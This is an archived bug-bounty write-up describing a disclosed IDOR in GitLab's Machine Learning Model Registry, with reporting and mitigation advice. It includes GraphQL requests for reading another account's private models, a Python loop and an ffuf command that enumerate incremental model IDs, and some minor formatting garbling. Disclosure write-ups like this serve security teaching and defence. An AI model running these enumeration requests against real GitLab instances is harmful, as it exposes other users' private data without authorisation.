# $1,160 Bounty

- **Source URL:** https://medium.com/h7w/1-160-bounty-unveiling-gitlabs-idor-flaw-248cc766fd1b?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20260308170114/https://medium.com/h7w/1-160-bounty-unveiling-gitlabs-idor-flaw-248cc766fd1b
- **Fetched:** 2026-11-21
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/10072 (id 10072)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# $1,160 Bounty: Unveiling GitLab’s IDOR Flaw

## A Deep Dive into Exploiting and Reporting a $1,160 Bounty-Winning IDOR Vulnerability in GitLab’s Machine Learning Model Registry

In the ever-evolving world of bug bounty hunting, Insecure Direct Object Reference (IDOR) vulnerabilities remain a goldmine for security researchers. A critical IDOR was discovered in GitLab’s Machine Learning Model Registry, allowing attackers to access *all* private models and their versions due to guessable, incremental IDs. This vulnerability, reported by @moblig\_ on HackerOne, earned a $1,160 bounty and exposed a flaw impacting all GitLab tiers (Free, Premium, Ultimate) and offerings ([GitLab.com](http://GitLab.com), Self-managed, GitLab Dedicated). This article provides a comprehensive walkthrough of the discovery, exploitation, and reporting process, with detailed steps to replicate the issue and insights to help you hunt similar bugs.

## Why IDORs Are a Bug Bounty Staple

IDOR vulnerabilities occur when an application allows unauthorized access to resources by manipulating identifiers, like user IDs or file names, without proper access controls. In GitLab’s case, the Machine Learning Model Registry — a feature for managing ML models and their metadata — used incremental model IDs, making it trivially easy to enumerate and access private models. This flaw, reported on May 31, 2024, highlights the dangers of predictable identifiers and lax authorization checks, a common issue in modern web applications.

This article breaks down:

- The vulnerability’s discovery using Burp Suite’s Autorize extension.
- Step-by-step reproduction using GraphQL queries.
- The impact and why it mattered across all GitLab tiers.
- Tips for crafting high-impact IDOR reports that resonate with security teams and social media audiences.

## Understanding GitLab’s Machine Learning Model Registry

Introduced in GitLab 15.11 as an experimental feature (`ml_experiment_tracking`) and made generally available in GitLab 16.2, the Model Registry is a centralized repository for managing machine learning models. It stores model versions, performance metrics, and metadata, enabling teams to track and deploy ML workloads. Accessible via GraphQL APIs, the registry assigns each model a unique ID (e.g., `gid://gitlab/Ml::Model/1000401`). Unfortunately, these IDs were incremental, and the API lacked proper access controls, leading to the IDOR vulnerability.

**Key Context**:

- **Feature Scope**: Available in all GitLab tiers (Free, Premium, Ultimate) and offerings ([GitLab.com](http://GitLab.com), Self-managed, GitLab Dedicated).
- **Attack Surface**: GraphQL endpoints (`/api/graphql`) for model and version queries.
- **Impact**: Unauthorized access to private models, including sensitive metadata and artifacts.

## Step 1: Setting Up the Testing Environment

To replicate this IDOR, you’ll need a controlled environment to avoid ethical or legal issues. Here’s how to prepare:

## Prerequisites

1. **Two GitLab Accounts**:

- **Account A**: Create a private project with a Model Registry set to `private`. This simulates a restricted model.
- **Account B**: A secondary account to test unauthorized access.

**2. Burp Suite**:

- Install Burp Suite Community or Pro.
- Configure your browser to proxy through Burp (`127.0.0.1:8080`).
- Install the **Autorize** extension from the BApp Store to detect authorization bypasses.

**3. GraphQL Client**: Use Burp’s Repeater, Postman, or a browser’s developer tools to send GraphQL queries.

**4. GitLab Instance**: Test on `gitlab.com` or a self-managed instance with the Model Registry enabled.

## Install Autorize

- In Burp Suite, go to **Extender > BApp Store** and install **Autorize**.
- Configure Autorize to use Account B’s session cookies to test for unauthorized access.
- Enable logging to capture GraphQL responses.

**Pro Tip**: Autorize automates IDOR testing by swapping session tokens and checking for unauthorized access. It’s a game-changer for finding bugs like this one.

## Step 2: Discovering the IDOR with Autorize

The vulnerability was uncovered using Burp Suite’s Autorize extension, which flagged a GraphQL endpoint bypassing authorization checks. Here’s how it happened:

1. **Intercept Traffic**:

- Log in to Account A and navigate to the private project’s Model Registry.
- Use Burp to intercept requests to [https://gitlab.com/api/graphql](https://gitlab.com/api/graphql.)
[.](https://gitlab.com/api/graphql.)
- Identify queries like `getModel` or `getModelVersion` in the HTTP history.

**2. Run Autorize**:

- Configure Autorize with Account B’s session cookies (low-privilege user).
- Replay Account A’s GraphQL requests using Account B’s session.
- Autorize flagged responses returning private model data, indicating an IDOR.

**3. Analyze the Response**:

- The response included sensitive model details (e.g., `id`, `name`, `description`, `candidate`, `metrics`) despite Account B lacking access.

## Step 3: Reproducing the Vulnerability

To confirm the IDOR, replicate the following steps using Account B (the unauthorized account).

## Step 1: Capture GraphQL Request

1. Log in to Account A and access a private model in the Model Registry.
2. In Burp Suite, intercept a `POST /api/graphql` request.
3. Extract the `Cookie` and `X-Csrf-Token` headers from the request.

Example request (simplified):

```
POST /api/graphql HTTP/2
Host: gitlab.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Content-Type: application/json
Cookie: <your-cookie>
X-Csrf-Token: <your-csrf-token>
```
`{"operationName":"getModel","variables":{"id":"gid://gitlab/Ml::Model/1000401"},"query":"query getModel($id: MlModelID!) {\\n  mlModel(id: $id) {\\n    id\\n    description\\n    name\\n    versionCount\\n    candidateCount\\n    latestVersion {\\n      id\\n      version\\n      packageId\\n      description\\n      candidate {\\n        id\\n        name\\n        status\\n      }\\n    }\\n  }\\n}"}`
1. Save the response, which should include private model details (e.g., `name`, `description`, `candidate`).

## Step 2: Test Unauthorized Access

1. Log in to Account B (no access to Account A’s project).
2. Use Burp Repeater to send the same GraphQL query, replacing the `Cookie` and `X-Csrf-Token` with Account B’s values.
3. Observe that the response still returns the private model’s data, confirming the IDOR.

## Step 3: Enumerate Models

1. Notice the model ID (`gid://gitlab/Ml::Model/1000401`) is incremental.
2. Decrement the ID (e.g., `1000400`, `1000399`) and resend the query.
3. Confirm that other models, including private ones, are accessible.

## Step fill: Access Model Versions

1. From the `getModel` response, extract the `latestVersion.id` (e.g., `gid://gitlab/Ml::ModelVersion/1000535`).
2. Send a `getModelVersion` query with Account B’s credentials:

```
POST /api/graphql HTTP/2
Host: gitlab.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Content-Type: application/json
Cookie: <account-b-cookie>
X-Csrf-Token: <account-b-csrf-token>
```
`{"operationName":"getModelVersion","variables":{"modelId":"gid://gitlab/Ml::Model/1000401","modelVersionId":"gid://gitlab/Ml::ModelVersion/1000535"},"query":"query getModelVersion($modelId: MlModelID!, $modelVersionId: MlModelVersionID!) {\\n  mlModel(id: $modelId) {\\n    id\\n    name\\n    version(modelVersionId: $modelVersionId) {\\n      id\\n      version\\n      packageId\\n      description\\n      candidate {\\n        id\\n        name\\n        status\\n      }\\n    }\\n  }\\n}"}`
1. Verify that private version details are exposed.

**Key Finding**: The incremental IDs (`1000401`, `1000400`, etc.) made it trivial to enumerate all models, amplifying the vulnerability’s impact.

## Step 4: Assessing the Impact

The IDOR’s severity stemmed from:

- **Universal Access**: Attackers could access *all* models across all GitLab tiers and offerings.
- **Sensitive Data Exposure**: Models contained metadata, performance metrics, and artifacts, potentially leaking proprietary ML algorithms or training data.
- **Ease of Exploitation**: Incremental IDs allowed automated enumeration with simple scripts.
- **Scope**: Affected [GitLab.com](http://GitLab.com), Self-managed, and GitLab Dedicated instances since version 15.11.

This earned a $1,160 bounty, reflecting its high impact and ease of exploitation.

## Step 5: Crafting a Viral Bug Report

A well-structured report maximizes your bounty and social media traction. Here’s how @moblig\_ nailed it:

## Report Structure

1. **Summary**:

- Clearly stated the IDOR affected the Model Registry, allowing access to all models and versions.
- Highlighted the incremental ID issue for easy enumeration.

**2. Steps to Reproduce**:

- Provided two accounts and a private project for testing.
- Included detailed GraphQL queries with screenshots

- Explained how to decrement IDs to access other models.

**3. Impact**:

- Emphasized universal access across all GitLab tiers.
- Noted potential data leakage of sensitive ML model details.
- Included visuals of private model data exposed via unauthorized requests.

## Tips for Your Reports

- **Be Clear**: Use numbered steps and code snippets, as shown above.
- **Visuals**: Attach screenshots or videos (e.g., OBS Studio recordings) to demonstrate the issue.
- **Scope**: Highlight the affected versions and platforms (e.g., GitLab 15.11+).
- **Ethical Disclosure**: Test only with permission and avoid public exposure before fixes.

## Step 6: Mitigating IDORs as a Developer

To prevent similar vulnerabilities, developers should:

- **Use UUIDs**: Replace incremental IDs with unpredictable UUIDs (e.g., `550e8400-e29b-41d4-a716-446655440000`).
- **Enforce Access Controls**: Validate user permissions for every GraphQL query.
- **Rate Limiting**: Throttle enumeration attempts to deter brute-forcing.
- **Audit APIs**: Regularly test GraphQL endpoints with tools like **GraphQLmap** or **InQL**.
- **Monitor Logs**: Detect anomalous access patterns using SIEM tools.

**Source**: Best practices from Virtual Cyber Labs emphasize RBAC and UUIDs to mitigate IDORs.

## Step 7: Automating IDOR Hunting

To scale your bug hunting, automate IDOR detection:

- **Autorize (Burp Suite)**: Swap session tokens to test for authorization bypasses.
- **Arjun/Parameth**: Discover hidden parameters in GraphQL queries (e.g., `/settings/profile`, `/api/v1/graphql`).
- **Custom Scripts**: Write Python scripts to enumerate IDs:

```
import requests
import json
```
url = "\<https://gitlab.com/api/graphql>"

headers = {

"Content-Type": "application/json",

"Cookie": "\<account-b-cookie>",

"X-Csrf-Token": "\<account-b-csrf-token>"

}

payload = {

"operationName": "getModel",

"variables": {"id": "gid://gitlab/Ml::Model/1000401"},

"query": "query getModel($id: MlModelID!) { mlModel(id: $id) { id description name } }"

}for i in range(1000400, 1000420):

payload\["variables"\]\["id"\] = f"gid://gitlab/Ml::Model/{i}"

response = requests.post(url, json=payload, headers=headers)

if response.status\_code == 200 and "mlModel" in response.json():

print(f"Model {i} exposed: {response.json()\['data'\]\['mlModel'\]\['name'\]}")

- **FFUF**: Fuzz GraphQL IDs:

`ffuf -u <https://gitlab.com/api/graphql> -w ids.txt:ID -H "Cookie: <account-b-cookie>" -H "X-Csrf-Token: <account-b-csrf-token>" -d '{"operationName":"getModel","variables":{"id":"gid://gitlab/Ml::Model/ID"},"query":"query getModel($id: MlModelID!) { mlModel(id: $id) { id name } }"}' -mc 200`
**ids.txt**:

```
1000400
1000401
1000402
...
```
## Real-World Impact: Why This Mattered

This IDOR exposed sensitive ML models, potentially leaking proprietary algorithms, training data, or business logic. With ML adoption soaring in 2025, such vulnerabilities could lead to:

- **Intellectual Property Theft**: Competitors accessing model metadata.
- **Data Breaches**: Exposure of PII embedded in model artifacts.
- **Reputation Damage**: Loss of trust in GitLab’s security.

The $1,160 bounty reflects the critical nature of the flaw, as noted in HackerOne’s disclosed report.

## Lessons for Bug Hunters

1. **Leverage Tools**: Autorize and Burp Suite are must-haves for IDOR hunting.
2. **Test GraphQL**: APIs like `/api/graphql` are prone to IDORs due to weak access controls.
3. **Enumerate IDs**: Incremental IDs are a red flag — always test for enumeration.
4. **Engage the Community**: Share findings on X with #BugBounty to inspire others and build your reputation.

Credit: [moblig](https://hackerone.com/moblig)

Report ID: [2528293](https://hackerone.com/reports/2528293)

## Conclusion: Hunt Smart, Win Big

The GitLab IDOR in the Machine Learning Model Registry is a textbook example of how simple oversights — like incremental IDs and missing access controls — can lead to critical vulnerabilities. By using tools like Burp Suite’s Autorize, crafting precise GraphQL queries, and writing clear reports, @moblig\_ turned a subtle flaw into a $1,160 bounty. Follow these steps, automate where possible, and share your journey to inspire the bug bounty community in 2025.

**Happy hunting, and may your IDs be unpredictable!**

## Tools

```
| **Tool**           | **Purpose**                    | **Key Use**                                |
| ------------------ | ------------------------------ | ------------------------------------------ |
| **Burp Suite**     | Intercept and analyze requests | Capture GraphQL queries and traffic        |
| **Autorize**       | Detect authorization bypasses  | Swap tokens to test access control flaws   |
| **FFUF**           | Fuzz IDs and endpoints         | Automate ID enumeration for IDOR detection |
| **Arjun/Parameth** | Discover hidden parameters     | Extract GraphQL or REST query params      |
```
## Resources Recap

```
| **Resource**         | **Use**                      | **Source**                                                                      |
| -------------------- | ---------------------------- | ------------------------------------------------------------------------------- |
| **SecLists**         | Wordlists for fuzzing        | GitHub: [`danielmiessler/SecLists`](https://github.com/danielmiessler/SecLists) |
| **HackerOne Report** | Original IDOR disclosure     | HackerOne: [#2528293](https://hackerone.com/reports/2528293)                    |
| **GitLab Docs**      | Model Registry documentation | [docs.gitlab.com](https://docs.gitlab.com)                                      |
```
**THANKS✨**
